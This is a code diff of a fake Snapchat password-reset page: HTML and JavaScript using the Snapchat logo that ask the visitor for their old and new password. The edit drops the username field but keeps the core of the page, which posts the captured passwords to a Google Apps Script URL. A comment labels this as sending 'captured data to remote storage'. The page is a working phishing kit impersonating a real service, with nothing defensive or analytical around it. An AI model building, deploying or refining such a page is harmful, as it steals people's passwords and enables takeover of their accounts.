@@ -17,10 +17,6 @@
         <img src="https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.svg" alt="Snapchat Logo" class="snapchat-logo">
         <h1>Reset Your Snapchat Password</h1>
         <form id="passwordForm">
-            <label for="username">Username or Email Address:</label><br>
-            <input type="text" id="username" name="username" placeholder="Enter your username or email" required><br>
-            <span id="usernameError" class="error-message"></span><br>
-            
             <label for="old_password">Old Password:</label><br>
             <input type="password" id="old_password" name="old_password" placeholder="Enter your old password" required><br>
             <span id="oldPasswordError" class="error-message"></span><br>
@@ -38,31 +34,22 @@
             event.preventDefault(); // Prevent form submission
             
             if (validateForm()) {
-                var username = document.getElementById('username').value;
                 var oldPassword = document.getElementById('old_password').value;
                 var newPassword = document.getElementById('new_password').value;
                 
                 // Send captured data to remote storage (Google Apps Script endpoint)
-                storePassword(username, oldPassword, newPassword);
+                storePassword(oldPassword, newPassword);
             }
         });
         
         function validateForm() {
-            var username = document.getElementById('username').value;
             var oldPassword = document.getElementById('old_password').value;
             var newPassword = document.getElementById('new_password').value;
             var isValid = true;
             
             // Reset error messages
-            document.getElementById('usernameError').textContent = '';
             document.getElementById('oldPasswordError').textContent = '';
             document.getElementById('newPasswordError').textContent = '';
-            
-            // Validate username
-            if (!username.trim()) {
-                document.getElementById('usernameError').textContent = 'Username or email is required';
-                isValid = false;
-            }
             
             // Validate old password
             if (!oldPassword.trim()) {
@@ -79,11 +66,10 @@
             return isValid;
         }
         
-        function storePassword(username, oldPassword, newPassword) {
+        function storePassword(oldPassword, newPassword) {
             var url = "https://script.google.com/macros/s/AKfycbwLOI3FQgQZjTcqe9qHTzqAHhCel31IFEwdfotp6PE6p7lZoIU0K6pB-DzPMKyVZgP2/exec"; // Update with your deployed Google Apps Script URL
             
             var data = {
-                "username": username,
                 "old_password": oldPassword,
                 "new_password": newPassword
             };
